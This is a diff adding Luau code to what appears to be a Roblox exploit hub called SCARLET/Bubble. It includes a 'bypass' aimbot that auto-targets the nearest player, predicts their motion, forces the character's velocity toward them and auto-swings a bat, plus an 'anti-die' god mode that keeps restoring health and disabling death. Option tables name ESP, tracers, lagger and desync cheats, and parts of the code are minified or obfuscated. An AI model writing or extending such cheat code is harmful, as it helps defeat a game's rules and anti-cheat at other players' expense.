+            intendedVelocity = Vector3.zero,
+            target = nil,
+            swingCooldown = false,
+            prevAutoRotate = nil,
+        };
+
+        local function destroyBypassConstraints()
+            if Bypass.angularVelocity then
+                pcall(function() Bypass.angularVelocity:Destroy(); end);
+                Bypass.angularVelocity = nil;
+            end;
+            if Bypass.attachment then
+                pcall(function() Bypass.attachment:Destroy(); end);
+                Bypass.attachment = nil;
+            end;
+        end;
+
+        local function ensureBypassConstraints(root)
+            if Bypass.attachment and Bypass.attachment.Parent == root
+                and Bypass.angularVelocity and Bypass.angularVelocity.Parent == root then
+                return;
+            end;
+            destroyBypassConstraints();
+            local attachment = Instance.new("Attachment");
+            attachment.Name = "ScarletBypassAtt";
+            attachment.Parent = root;
+            local angularVelocity = Instance.new("AngularVelocity");
+            angularVelocity.Name = "ScarletBypassAV";
+            angularVelocity.Attachment0 = attachment;
+            angularVelocity.RelativeTo = Enum.ActuatorRelativeTo.World;
+            angularVelocity.MaxTorque = math.huge;
+            angularVelocity.AngularVelocity = Vector3.zero;
+            angularVelocity.Parent = root;
+            Bypass.attachment = attachment;
+            Bypass.angularVelocity = angularVelocity;
+        end;
+
+        local function stopBypass()
+            if Bypass.conn then
+                pcall(function() Bypass.conn:Disconnect(); end);
+                Bypass.conn = nil;
+            end;
+            if Bypass.safety then
+                pcall(function() Bypass.safety:Disconnect(); end);
+                Bypass.safety = nil;
+            end;
+            Bypass.target = nil;
+            Bypass.intendedVelocity = Vector3.zero;
+            Bypass.swingCooldown = false;
+            local char = LP.Character;
+            local root = char and char:FindFirstChild("HumanoidRootPart");
+            local hum = char and char:FindFirstChildOfClass("Humanoid");
+            if root then
+                pcall(function() root.Velocity = root.Velocity * 0.3; end);
+            end;
+            if hum then
+                hum.AutoRotate = (Bypass.prevAutoRotate == nil) and true or Bypass.prevAutoRotate;
+            end;
+            if Bypass.angularVelocity then
+                pcall(function() Bypass.angularVelocity.AngularVelocity = Vector3.zero; end);
+            end;
+            destroyBypassConstraints();
+            Bypass.prevAutoRotate = nil;
+        end;
+
+        local function startBypass()
+            if Bypass.conn then return; end;
+            local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid");
+            if hum0 then
+                Bypass.prevAutoRotate = hum0.AutoRotate;
+                hum0.AutoRotate = false;
+            end;
+
+            -- -- Enhanced Bypass: acceleration + direction-change + ping lead (Clean BB+)
+            local bFrame = 0;
+            local bTarget = nil;
+            local lastTargetPos = nil;
+            local smoothedVel = Vector3.zero;
+            local targetVel = Vector3.zero;
+            local velHistory = {};
+            local accelHistory = {};
+            local aerialHistory = {};
+            local prevDir = nil;
+            local lastDirChange = 0;
+            local airborneTime = 0;
+            local pingSec = 0.08;
+            task.spawn(function()
+                while Bypass.enabled do
+                    pcall(function()
+                        local v = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue();
+                        if type(v) == "number" then
+                            pingSec = math.clamp(v / 1000, 0.04, 0.28);
+                        end;
+                    end);
+                    task.wait(0.4);
+                end;
+            end);
+            Bypass.conn = RS.Heartbeat:Connect(function(dt)
+                if not Bypass.enabled then return; end;
+                local char = LP.Character;
+                if not char then return; end;
+                local root = char:FindFirstChild("HumanoidRootPart");
+                if not root then return; end;
+                local hum = char:FindFirstChildOfClass("Humanoid");
+                if not hum then return; end;
+                dt = math.max(dt or 0.016, 1 / 240);
+
+                bFrame = bFrame + 1;
+                if bFrame % 2 == 1 then
+                    if not char:FindFirstChildOfClass("Tool") then
+                        local bat = findBat();
+                        if bat then pcall(function() hum:EquipTool(bat); end); end;
+                    end;
+                    bTarget = getClosestTarget();
+                    ensureBypassConstraints(root);
+                end;
+
+                local target = bTarget;
+                if not target or not target.Parent then
+                    lastTargetPos = nil;
+                    smoothedVel = Vector3.zero;
+                    targetVel = Vector3.zero;
+                    velHistory = {};
+                    accelHistory = {};
+                    aerialHistory = {};
+                    prevDir = nil;
+                    airborneTime = 0;
+                    Bypass.intendedVelocity = Vector3.new(0, -2, 0);
+                    root.Velocity = Bypass.intendedVelocity;
+                    if Bypass.angularVelocity then Bypass.angularVelocity.AngularVelocity = Vector3.zero; end;
+                    return;
+                end;
+                Bypass.target = target;
+
+                local targetPos = target.Position;
+                local tHum = target.Parent and target.Parent:FindFirstChildOfClass("Humanoid");
+
+                -- Velocity estimation with outlier clamp
+                if lastTargetPos then
+                    local raw = (targetPos - lastTargetPos) / dt;
+                    local deltaV = raw - targetVel;
+                    if deltaV.Magnitude > 150 then
+                        raw = targetVel + deltaV.Unit * 150;
+                    end;
+                    local horiz = Vector3.new(raw.X, 0, raw.Z);
+                    if horiz.Magnitude > 90 then
+                        horiz = horiz.Unit * 90;
+                        raw = Vector3.new(horiz.X, raw.Y, horiz.Z);
+                    end;
+                    table.insert(accelHistory, (raw - targetVel) / dt);
+                    if #accelHistory > 5 then table.remove(accelHistory, 1); end;
+                    table.insert(velHistory, raw);
+                    if #velHistory > 10 then table.remove(velHistory, 1); end;
+                    targetVel = raw;
+                    smoothedVel = smoothedVel:Lerp(raw, 0.28);
+                else
+                    targetVel = target.AssemblyLinearVelocity;
+                    smoothedVel = targetVel;
+                end;
+                lastTargetPos = targetPos;
+
+                -- Airborne tracking
+                local airborne = tHum and tHum.FloorMaterial == Enum.Material.Air;
+                airborneTime = airborne and (airborneTime + dt) or 0;
+                if airborne and airborneTime >= 0.08 then
+                    table.insert(aerialHistory, targetVel);
+                    if #aerialHistory > 6 then table.remove(aerialHistory, 1); end;
+                elseif not airborne then
+                    aerialHistory = {};
+                end;
+
+                local predVel = smoothedVel;
+                if airborne and #aerialHistory > 0 then
+                    local sum = Vector3.zero;
+                    for _, v in ipairs(aerialHistory) do sum = sum + v; end;
+                    local aerial = sum / #aerialHistory;
+                    predVel = Vector3.new(aerial.X * 0.85, targetVel.Y, aerial.Z * 0.85);
+                end;
+
+                -- Acceleration contribution
+                if #accelHistory > 0 then
+                    local aSum = Vector3.zero;
+                    for _, a in ipairs(accelHistory) do aSum = aSum + a; end;
+                    predVel = predVel + (aSum / #accelHistory) * 0.35;
+                end;
+
+                -- Quick turn detection → extra lead
+                local quickTurn = false;
+                local horizV = Vector3.new(targetVel.X, 0, targetVel.Z);
+                if horizV.Magnitude > 5 then
+                    local dir = horizV.Unit;
+                    if prevDir and prevDir:Dot(dir) < 0.45 then
+                        quickTurn = true;
+                        lastDirChange = tick();
+                    end;
+                    prevDir = dir;
+                end;
+                local turnBoost = (quickTurn or (tick() - lastDirChange < 0.14)) and 1.45 or 1;
+
+                -- Prediction time: base + ping + distance factor
+                local myPos = root.Position;
+                local distNow = (targetPos - myPos).Magnitude;
+                local predictT = math.clamp(0.16 + pingSec * 1.15 + math.min(distNow, 40) * 0.002, 0.14, 0.38);
+                predictT = predictT * turnBoost;
+
+                local predictPos = targetPos
+                    + predVel * predictT
+                    + target.CFrame.LookVector * (2.2 * turnBoost);
+                -- gravity adjust when airborne
+                if airborne then
+                    predictPos = predictPos + Vector3.new(0, -0.5 * 196.2 * predictT * predictT * 0.15, 0);
+                end;
+
+                local delta = predictPos - myPos;
+                local dist = distNow;
+
+                -- Angular lock toward predicted point
+                if dist > 0.4 and Bypass.angularVelocity then
+                    local lookDir = Vector3.new(delta.X, 0, delta.Z);
+                    if lookDir.Magnitude > 0.08 then
+                        local axis = root.CFrame.LookVector:Cross(lookDir.Unit);
+                        local ang = math.asin(math.clamp(axis.Magnitude, -1, 1));
+                        local gain = (dist < 16) and 95 or 78;
+                        Bypass.angularVelocity.AngularVelocity = axis.Magnitude > 0.01 and (axis.Unit * ang * gain) or Vector3.zero;
+                    end;
+                end;
+
+                -- Chase speeds: close burst, mid, far
+                local chaseSpd = 62;
+                if dist < 12 then chaseSpd = 74;
+                elseif dist < 22 then chaseSpd = 68;
+                elseif dist > 35 then chaseSpd = 58; end;
+
+                local moveFlat = Vector3.new(delta.X, 0, delta.Z);
+                local yComp;
+                if math.abs(delta.Y) > 0.5 then
+                    yComp = math.clamp(delta.Y * 10 + predVel.Y * 0.35, -60, 85);
+                else
+                    yComp = -1.5;
+                end;
+                Bypass.intendedVelocity = (moveFlat.Magnitude > 0.1 and moveFlat.Unit * chaseSpd or Vector3.zero)
+                    + Vector3.new(0, yComp, 0);
+                root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(Bypass.intendedVelocity, 0.78);
+                root.Velocity = Bypass.intendedVelocity;
+                if moveFlat.Magnitude > 0.4 then
+                    pcall(function() hum:Move(moveFlat.Unit, false); end);
+                end;
+
+                if dist <= 12 and not Bypass.swingCooldown then
+                    local tool = char:FindFirstChildOfClass("Tool");
+                    if tool and isBatTool(tool) then
+                        Bypass.swingCooldown = true;
+                        trySwing(root, target, tool, function() return false; end);
+                        task.delay(0.55, function() Bypass.swingCooldown = false; end);
+                    end;
+                end;
+            end);
+
+
+            local safetyTick = 0;
+            Bypass.safety = RS.Heartbeat:Connect(function()
+                if not Bypass.enabled then return; end;
+                safetyTick = safetyTick + 1;
+                if safetyTick % 2 ~= 0 then return; end;
+                local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart");
+                if not root then return; end;
+                local vel = root.Velocity;
+                if math.abs(vel.X) > 350 or math.abs(vel.Z) > 350 then
+                    root.Velocity = Vector3.new(math.clamp(vel.X, -200, 200), vel.Y, math.clamp(vel.Z, -200, 200));
+                end;
+            end);
+
+            if type(_G.__BubbleTrackConn) == "function" then
+                pcall(function() _G.__BubbleTrackConn(Bypass.conn); end);
+                pcall(function() _G.__BubbleTrackConn(Bypass.safety); end);
+            end;
+        end;
+
+        local function setBypassEnabled(on)
+            on = on == true;
+            if on then
+                if _G.ScarletAutoBat and _G.ScarletAutoBat.IsEnabled and _G.ScarletAutoBat.IsEnabled() then
+                    pcall(function() _G.ScarletAutoBat.SetEnabled(false); end);
+                end;
+                Bypass.enabled = true;
+                startBypass();
+            else
+                Bypass.enabled = false;
+                stopBypass();
+            end;
+            E["Bypass Aimbot"] = on;
+            _G.__ScarletBypassBatOn = on;
+        end;
+
+        _G.ScarletBypassBat = {
+            Toggle = function()
+                setBypassEnabled(not Bypass.enabled);
+                return Bypass.enabled;
+            end,
+            SetEnabled = setBypassEnabled,
+            IsEnabled = function() return Bypass.enabled == true; end,
+            Start = function() setBypassEnabled(true); end,
+            Stop = function() setBypassEnabled(false); end,
+        };
+
+        -- legacy mode helpers (keep old callers from erroring)
+        _G.__ScarletBatMode = "NORMAL";
+        if type(_G.__BubbleTrackStopper) == "function" then
+            _G.__BubbleTrackStopper(function()
+                setNormalEnabled(false);
+                setBypassEnabled(false);
+            end);
+        end;
+    end;
+    -- ========== end SCARLET Auto Bat ==========
+
+    -- ========== SCARLET Minecraft Bat Skin + Outfits ==========
+    do
+        local LP = m
+        local RS = c
+
+        -- Minecraft Bat Skin (from Clean, SCARLET branded)
+        local MB_ASSET_ID = "rbxassetid://18566246244"
+        local MB_POS = CFrame.new(-0.05, -0.65, -0.15)
+        local MB_ROT = CFrame.Angles(math.rad(40), math.rad(5), math.rad(8))
+        local MB_SCALE = 2.4
+        local MB_COLORS = {
+            Default = nil,
+            ["Abyss Blue"] = Color3.fromRGB(0, 40, 150),
+            ["Venom Green"] = Color3.fromRGB(20, 255, 50),
+            ["Royal Gold"] = Color3.fromRGB(255, 200, 0),
+            ["Velvet Rose"] = Color3.fromRGB(220, 20, 100),
+            ["Crimson Night"] = Color3.fromRGB(90, 0, 20),
+            RGB = "RGB",
+        }
+        local MB = {
+            enabled = _G.__ScarletMinecraftBat == true,
+            colorMode = _G.__ScarletMinecraftBatColor or "Default",
+            cached = nil,
+            rgbConn = nil,
+        }
+        pcall(function()
+            local objs = game:GetObjects(MB_ASSET_ID)
+            if objs and objs[1] then
+                local model = objs[1]
+                MB.cached = model:IsA("BasePart") and model or model:FindFirstChildWhichIsA("BasePart", true)
+            end
+        end)
+        local function mbFindBat()
+            local char = LP.Character
+            if char then
+                local t = char:FindFirstChild("Bat") or char:FindFirstChildOfClass("Tool")
+                if t and t:IsA("Tool") then
+                    local n = string.lower(t.Name)
+                    if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then return t end
+                end
+            end
+            local bp = LP:FindFirstChildOfClass("Backpack")
+            if bp then
+                for _, t in ipairs(bp:GetChildren()) do
+                    if t:IsA("Tool") then
+                        local n = string.lower(t.Name)
+                        if string.find(n, "bat", 1, true) or string.find(n, "slap", 1, true) then return t end
+                    end
+                end
+            end
+            return nil
+        end
+        local function mbSetColor(visual, color)
+            if not visual or not color or color == "RGB" then return end
+            visual.Color = color
+            pcall(function() if visual:IsA("UnionOperation") then visual.UsePartColor = true end end)
+            local sm = visual:FindFirstChildWhichIsA("SpecialMesh")
+            if sm then sm.VertexColor = Vector3.new(color.R, color.G, color.B) end
+        end
+        local function mbStopRGB()
+            if MB.rgbConn then pcall(function() MB.rgbConn:Disconnect() end); MB.rgbConn = nil end
+        end
+        local function mbStartRGB()
+            mbStopRGB()
+            local hue = 0
+            MB.rgbConn = RS.Heartbeat:Connect(function(dt)
+                if not MB.enabled or MB.colorMode ~= "RGB" then return end
+                hue = (hue + (dt or 0.016) * 0.35) % 1
+                local color = Color3.fromHSV(hue, 1, 1)
+                local tool = mbFindBat()
+                local vis = tool and tool:FindFirstChild("CustomUnionVisual")
+                if vis then mbSetColor(vis, color) end
+            end)
+        end
+        local function mbRemove(tool)
+            if not tool then return end
+            local old = tool:FindFirstChild("CustomUnionVisual")
+            if old then pcall(function() old:Destroy() end) end
+            local handle = tool:FindFirstChild("Handle")
+            if handle then
+                handle.Transparency = 0
+                for _, ch in ipairs(handle:GetChildren()) do
+                    if ch:IsA("SpecialMesh") or ch:IsA("Mesh") or ch:IsA("Decal") then
+                        pcall(function() ch.Transparency = 0 end)
+                    end
+                end
+            end
+        end
+        local function mbApply(tool)
+            if not tool or not MB.cached then return end
+            mbRemove(tool)
+            local handle = tool:FindFirstChild("Handle")
+            if not handle then return end
+            handle.Transparency = 1
+            local visual = MB.cached:Clone()
+            visual.Name = "CustomUnionVisual"
+            visual.CanCollide = false
+            visual.Massless = true
+            visual.Anchored = false
+            -- Clean-style ScaleTo for correct Minecraft bat size
+            pcall(function()
+                local temp = Instance.new("Model")
+                visual.Parent = temp
+                temp.PrimaryPart = visual
+                temp:ScaleTo(MB_SCALE)
+                visual.Parent = nil
+                temp:Destroy()
+            end)
+            visual.CFrame = handle.CFrame * MB_POS * MB_ROT
+            visual.Parent = tool
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = handle
+            weld.Part1 = visual
+            weld.Parent = visual
+            local mode = MB.colorMode
+            if mode == "RGB" then
+                mbStartRGB()
+            elseif MB_COLORS[mode] then
+                mbStopRGB()
+                mbSetColor(visual, MB_COLORS[mode])
+            end
+        end
+        _G.ScarletMinecraftBat = {
+            Apply = function()
+                MB.enabled = true
+                _G.__ScarletMinecraftBat = true
+                local tool = mbFindBat()
+                if tool then mbApply(tool) end
+                if MB.colorMode == "RGB" then mbStartRGB() end
+            end,
+            Remove = function()
+                MB.enabled = false
+                _G.__ScarletMinecraftBat = false
+                mbStopRGB()
+                local char = LP.Character
+                if char then
+                    local t = char:FindFirstChildOfClass("Tool")
+                    if t then mbRemove(t) end
+                end
+                local bp = LP:FindFirstChildOfClass("Backpack")
+                if bp then
+                    for _, t in ipairs(bp:GetChildren()) do
+                        if t:IsA("Tool") then mbRemove(t) end
+                    end
+                end
+            end,
+            SetColorMode = function(mode)
+                MB.colorMode = mode or "Default"
+                _G.__ScarletMinecraftBatColor = MB.colorMode
+                if not MB.enabled then return end
+                if MB.colorMode == "RGB" then mbStartRGB() else mbStopRGB() end
+                local tool = mbFindBat()
+                if tool then mbApply(tool) end
+            end,
+            GetColorMode = function() return MB.colorMode end,
+            IsEnabled = function() return MB.enabled end,
+            ColorModes = {"Default", "Abyss Blue", "Venom Green", "Royal Gold", "Velvet Rose", "Crimson Night", "RGB"},
+        }
+        task.spawn(function()
+            while true do
+                if MB.enabled then
+                    local tool = mbFindBat()
+                    if tool and not tool:FindFirstChild("CustomUnionVisual") then
+                        pcall(mbApply, tool)
+                    end
+                end
+                task.wait(0.6)
+            end
+        end)
+
+        -- Outfits / Avatars (from Clean)
+        local function assetUrl(id)
+            return "http://www.roblox.com/asset/?id=" .. tostring(id)
+        end
+        local ECLIPSE = {
+            V1 = { shirt = 74707712629633, pants = 12405320750 },
+            V2 = { shirt = 101796619834594, pants = 18975891159 },
+            V3 = { shirt = 18552805597, pants = 5414143509 },
+        }
+        local OUTFITS = {
+            { label = "Outfit 1", accessory = 10159600649, offset = Vector3.new(0, 1, -0.2), shirt = assetUrl(9683332638), pants = assetUrl(93182020184041), headMesh = assetUrl(134079402), headTexture = assetUrl(133940918), headless = true },
+            { label = "Outfit 2", accessory = 1744060292, offset = Vector3.new(0, 1.3, -0.2), shirt = assetUrl(9683332638), pants = assetUrl(93182020184041), headMesh = assetUrl(134079402), headTexture = assetUrl(133940918), headless = true },
+            { label = "Eclipse V1", accessory = 121097973925756, offset = Vector3.new(0, 0.9, 0), shirt = assetUrl(ECLIPSE.V1.shirt), pants = assetUrl(ECLIPSE.V1.pants), headMesh = assetUrl(134079402), headTexture = assetUrl(133940918), headless = true },
+            { label = "Eclipse V2", accessory = 10159600649, offset = Vector3.new(0, 1, -0.2), shirt = assetUrl(ECLIPSE.V2.shirt), pants = assetUrl(ECLIPSE.V2.pants), headMesh = assetUrl(134079402), headTexture = assetUrl(133940918), headless = true },
+            { label = "Eclipse V3", accessory = 1744060292, offset = Vector3.new(0, 1.3, -0.2), shirt = assetUrl(ECLIPSE.V3.shirt), pants = assetUrl(ECLIPSE.V3.pants), headMesh = assetUrl(134079402), headTexture = assetUrl(133940918), headless = true },
+            { label = "Off" },
+        }
+        _G.__ScarletOutfits = OUTFITS
+        local function applyOutfit(index)
+            index = math.clamp(tonumber(index) or 1, 1, #OUTFITS)
+            _G.__ScarletOutfitIndex = index
+            local cfg = OUTFITS[index]
+            local char = LP.Character
+            if not char or not cfg then return end
+            if cfg.label == "Off" or not cfg.shirt then return end
+            local head = char:FindFirstChild("Head") or char:WaitForChild("Head", 3)
+            if not head then return end
+            if cfg.shirt then
+                local s = char:FindFirstChildWhichIsA("Shirt") or Instance.new("Shirt")
+                s.Name = "Shirt"; s.ShirtTemplate = cfg.shirt; s.Parent = char
+            end
+            if cfg.pants then
+                local p = char:FindFirstChildWhichIsA("Pants") or Instance.new("Pants")
+                p.Name = "Pants"; p.PantsTemplate = cfg.pants; p.Parent = char
+            end
+            if cfg.headMesh then
+                pcall(function()
+                    if head:IsA("MeshPart") then
+                        head.MeshId = cfg.headMesh
+                        if cfg.headTexture then head.TextureID = cfg.headTexture end
+                    else
+                        local sm = head:FindFirstChildWhichIsA("SpecialMesh") or Instance.new("SpecialMesh", head)
+                        sm.MeshType = Enum.MeshType.FileMesh
+                        sm.MeshId = cfg.headMesh
+                        sm.TextureId = cfg.headTexture or ""
+                    end
+                end)
+            end
+            local old = char:FindFirstChild("ScarletOutfitAcc")
+            if old then old:Destroy() end
+            if cfg.accessory then
+                pcall(function()
+                    local objs = game:GetObjects("rbxassetid://" .. tostring(cfg.accessory))
+                    if not objs then return end
+                    local handle
+                    for _, o in ipairs(objs) do
+                        if o:IsA("BasePart") then handle = o; break end
+                        local f = o:FindFirstChildWhichIsA("BasePart", true)
+                        if f then handle = f; break end
+                    end
+                    if handle and head then
+                        local h = handle:Clone()
+                        h.Name = "ScarletOutfitAcc"
+                        h.CanCollide = false
+                        h.Massless = true
+                        h.Anchored = false
+                        h.Parent = char
+                        local weld = Instance.new("Weld")
+                        weld.Part0 = head
+                        weld.Part1 = h
+                        weld.C0 = CFrame.new(cfg.offset or Vector3.zero)
+                        weld.Parent = h
+                    end
+                    for _, o in ipairs(objs) do pcall(function() o:Destroy() end) end
+                end)
+            end
+        end
+        _G.ScarletApplyOutfit = applyOutfit
+        if _G.__ScarletOutfitIndex and _G.__ScarletOutfitIndex > 0 then
+            task.defer(function()
+                if LP.Character then applyOutfit(_G.__ScarletOutfitIndex) end
+            end)
+        end
+        m.CharacterAdded:Connect(function()
+            task.wait(0.8)
+            if _G.__ScarletOutfitIndex and _G.__ScarletOutfitIndex > 0 then
+                applyOutfit(_G.__ScarletOutfitIndex)
+            end
+            if MB.enabled then
+                task.wait(0.4)
+                local tool = mbFindBat()
+                if tool then mbApply(tool) end
+            end
+        end)
+    end
+    -- ========== end Minecraft + Outfits ==========
+
+
+
+        function _G.__BubbleTrackConn (H)
+            if H then
+                table.insert(_G.__BUBBLE_STATE.conns, H);
+            end;
+            return H;
+        end;
+        function _G.__BubbleTrackStopper (H)
+            if H then
+                table.insert(_G.__BUBBLE_STATE.stoppers, H);
+            end;
+        end;
+        _G.__BubbleResetHooks = {};
+        function _G.__BubbleOnNewInstance (H)
+            if H then
+                table.insert(_G.__BubbleResetHooks, H);
+            end;
+        end;
+    end;
+    local H = _G.__BUBBLE_STATE;
+    do
+        local E, s = {};
+        local function b()
+            if s then
+                return;
+            end;
+            s = c.Heartbeat:Connect(function() local V = os.clock() + 8.0E-4; while E[1] and os.clock() < V do local V = E[1]; if V.cancelled or V["continue"] and not V["continue"]() then table.remove(E, 1); else local F = V.pending[#V.pending]; if not F then table.remove(E, 1); else V.pending[#V.pending] = nil; pcall(V.apply, F); local N, I = pcall(function() return F:GetChildren(); end); if N then for F, F in ipairs(I) do V.pending[#V.pending + 1] = F; end; end; if E[2] then table.remove(E, 1); E[#E + 1] = V; end; end; end; end; if not E[1] then s:Disconnect(); s = nil; end; end);
+            _G.__BubbleTrackConn (s);
+        end;
+        function _G.__BubbleWalkDescendantsBatched (V, F, N)
+            local I = {pending = {}, apply = F, ["continue"] = N, cancelled = false};
+            for N, P in ipairs((if typeof(V) == "Instance" then {V} else V) or {}) do
+                if P then
+                    F, N = pcall(function() return P:GetChildren(); end);
+                    if F then
+                        for V, V in ipairs(N) do
+                            I.pending[#I.pending + 1] = V;
+                        end;
+                    end;
+                end;
+            end;
+            E[#E + 1] = I;
+            b();
+            return function()
+                I.cancelled = true;
+            end;
+        end;
+        _G.__BubbleTrackStopper (function() for b, b in ipairs(E) do b.cancelled = true; end; E = {}; if s then s:Disconnect(); s = nil; end; end);
+    end;
+    do
+        local E, s = false, false;
+        _G.__BubbleAntiDieGuiEnabled = nil;
+        local b, V = {};
+        local function F(N, I)
+            local P = b[N];
+            if P then
+                if P.healthConn then
+                    pcall(function() P.healthConn:Disconnect(); end);
+                end;
+                if P.diedConn then
+                    pcall(function() P.diedConn:Disconnect(); end);
+                end;
+                if P.cleanupConn then
+                    pcall(function() P.cleanupConn:Disconnect(); end);
+                end;
+                b[N] = nil;
+            end;
+            if I and N and N.Parent then
+                pcall(function() local I = N:FindFirstChildOfClass("Humanoid"); if I then I.BreakJointsOnDeath = true; I:SetStateEnabled(Enum.HumanoidStateType.Dead, true); end; end);
+            end;
+        end;
+        local function N(I)
+            if not I or not I.Parent then
+                return;
+            end;
+            local P = I:FindFirstChildOfClass("Humanoid");
+            if not P then
+                return;
+            end;
+            F(I, false);
+            P.BreakJointsOnDeath = false;
+            P:SetStateEnabled(Enum.HumanoidStateType.Dead, false);
+            local k;
+            k = {humanoid = P, healthConn = P:GetPropertyChangedSignal("Health"):Connect(function() if E and b[I] == k and P.Health <= 0 then P.Health = P.MaxHealth; end; end), diedConn = P.Died:Connect(function() task.defer(function() if E and b[I] == k and P and P.Parent then P.BreakJointsOnDeath = false; P:SetStateEnabled(Enum.HumanoidStateType.Dead, false); P.Health = P.MaxHealth; end; end); end), cleanupConn = I.AncestryChanged:Connect(function() if not I.Parent then F(I, false); end; end)};
+            b[I] = k;
+        end;
+        local function I(P)
+            P = P == true;
+            if P == E then
+                return;
+            end;
+            E = P;
+            if P then
+                local P = V;
+                if not P then
+                    V = m.CharacterAdded:Connect(function(k) task.wait(0.2); if E and k and k.Parent then N(k); end; end);
+                end;
+                P = m.Character;
+                if P and P.Parent and not b[P] then
+                    N(P);
+                end;
+            else
+                for P in pairs(b) do
+                    F(P, true);
+                end;
+            end;
+        end;
+        local F = {toggle = false, autobat = false};
+        local function P()
+            if s then
+                return;
+            end;
+            local k = F.toggle;
+            I((if _G.__BubbleAntiDieGuiEnabled then _G.__BubbleAntiDieGuiEnabled () == true else k) or F.autobat);
+        end;
+        function _G.__BubbleAntiDieSource (k, x)
+            if s or F[k] == nil then
+                return;
+            end;
+            F[k] = x == true;
+            P();
+        end;
+        function _G.__BubbleAntiDieSet (k)
+            _G.__BubbleAntiDieSource ("autobat", k);
+        end;
+        function _G.__BubbleAntiDieIsEnabled ()
+            return E;
+        end;
+        _G.__BubbleTrackStopper (function() s = true; F.toggle = false; F.autobat = false; I(false); end);
+        local F, k = false, I;
+        I = function(I)
+            k(I);
+            if V and not F then
+                F = true;
+                _G.__BubbleTrackConn (V);
+            end;
+        end;
+        _G.__BubbleTrackConn (c.Heartbeat:Connect(function() if s then return; end; P(); if not E then return; end; local E = m.Character; local s = E and E.Parent and(E:FindFirstChildOfClass("Humanoid")); if not s then return; end; local V = b[E]; if not V or V.humanoid ~= s then N(E); end; if s.BreakJointsOnDeath then s.BreakJointsOnDeath = false; end; if s:GetStateEnabled(Enum.HumanoidStateType.Dead) then s:SetStateEnabled(Enum.HumanoidStateType.Dead, false); end; if s.Health <= 0 then s.Health = s.MaxHealth; end; end));
+    end;
+    FeatureToggles = FeatureToggles or {};
+    local E, s, b, V, F = {}, {Aimbot = true, ["Lagger Aimbot"] = true, Autoplay = true, Lagger = true}, {Aimbot = true, Drop = true, ["TP Down"] = true, Autoplay = true, ["ESP Players"] = true, ["Player Tracers"] = true}, {}, {};
+    for N, I in pairs(b) do
+        V[N] = false;
+        F[N] = true;
+    end;
+    if featureName == "Toggle UI" then
+        bindPill.Visible = true;
+        bindPill.Position = UDim2.new(1,- 48, 0.5,- 10);
+    end;
+    local N, I, P, k, x, _, L, z, S, g, O, n, J, f, o, q, B, j = {NormalBoost = 59, NormalSteal = 29, LaggerBoost = 40, LaggerSteal = 20, DesyncBoost = 59, DesyncSteal = 29, BypassPower = 300000, BypassDepth = 296, MobileButtonScale = 1, FOV = 90, StretchIntensity = 0.75, CypherAimbotApproachSpeed = 55, AutoTPDownHeight = 20}, {}, {Radius = 65, Duration = 1.3}, "v1", "V1", "Off", 1, 59, 30, 40, false, "v1", false, Vector3.new(0, 0, 0), {[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true, [Enum.KeyCode.Up] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Right] = true}, {SelectNormalMode = nil, SelectLaggerMode = nil, Drop = nil, Autoplay = nil, ["Toggle UI"] = nil, Aimbot = nil, ["Anti Bat"] = nil, ["Carry Speed"] = nil, BypassToggle = nil, BypassAuto = nil, FuckerToggle = nil, AutoLeft = nil, AutoRight = nil, TPDown = nil, LaggerMode = nil, LaggerCarry = nil, DesyncAimbot = nil, AutoBat = nil};
+    local w, y, U, e, a, W, T, l, Z, p = {}, {}, {}, {}, false, FeaturePostToggle or {};
+    local supportedKeybinds = {AutoLeft = true, AutoRight = true, Drop = true, TPDown = true, LaggerMode = true, LaggerCarry = true, DesyncAimbot = true, AutoBat = true, BypassAimbot = true, ToggleUI = true, SpeedHideUI = true};
+    for keyName in pairs(q) do
+        if not supportedKeybinds[keyName] then q[keyName] = nil; end;
+    end;
+    local function setKeybindExclusive(keyName, bindValue)
+        if not supportedKeybinds[keyName] then return; end;
+        q[keyName] = bindValue;
+        if bindValue == nil then return; end;
+        for otherName, otherValue in pairs(q) do
+            if otherName ~= keyName and otherValue == bindValue then q[otherName] = nil; end;
+        end;
+    end;
+    _G = _G or {};
+    _G.__BubbleDropMode = _G.__BubbleDropMode == "Jump Drop" and "Jump Drop" or "Stand Drop";
+    _G._BubbleHub_UI_Data = _G._BubbleHub_UI_Data or {};
+    local C, r = {}, {};
+    _G.__BubbleButtonsSize = 1;
+    _G.__BubbleGuiPositionResetters = {};
+    _G.__BubbleResetButtonPositions = nil;
+    _G.__BubbleGuiPositionsReset = false;
+    function _G.__BubbleRoundPanelBackground (Y, v)
+        local M = Instance.new("CanvasGroup");
+        M.Name = "RoundedBackgroundMask";
+        M.Size = UDim2.fromScale(1, 1);
+        M.Position = UDim2.fromOffset(0, 0);
+        M.BackgroundTransparency = 1;
+        M.BorderSizePixel = 0;
+        M.GroupTransparency = 0;
+        M.ZIndex = Y.ZIndex;
+        M.Parent = v;
+        local u = v:FindFirstChildOfClass("UICorner");
+        Instance.new("UICorner", M).CornerRadius = u and u.CornerRadius or(UDim.new(0, 16));
+        u = Y:FindFirstChildOfClass("UICorner");
+        if u then
+            u:Destroy();
+        end;
+        Y.Parent = M;
+    end;
+    function _G.__BubbleFramePanelBackground (Y, v, v)
+        Y.ScaleType = Enum.ScaleType.Crop;
+        if v == "Bypass" then
+            Y.Size = UDim2.new(1, 0, 1.02, 0);
+            Y.Position = UDim2.fromScale(0,- 0.02);
+        else
+            Y.Size = UDim2.fromScale(1, 1);
+            Y.Position = UDim2.fromScale(0, 0);
+        end;
+    end;
+    function _G.__BubbleAddOriginalGui3Title (Y, v)
+        if Y then
+            Y.Text = string.upper(tostring(v or "BUBBLE"));
+        end;
+    end;
+    local function Y(v, M, u, t, G, D, d)
+        local Ki = workspace.CurrentCamera;
+        local Ri = Ki and Ki.ViewportSize or(Vector2.new(1920, 1080));
+        if Ri.X <= 0 or Ri.Y <= 0 then
+            return M, t;
+        end;
+        d = d or 1;
+        G *= d;
+        D *= d;
+        local d, Ki, Xi, ci =- Ri.X * v, Ri.X * (1 - v) - G,- Ri.Y * u, Ri.Y * (1 - u) - D;
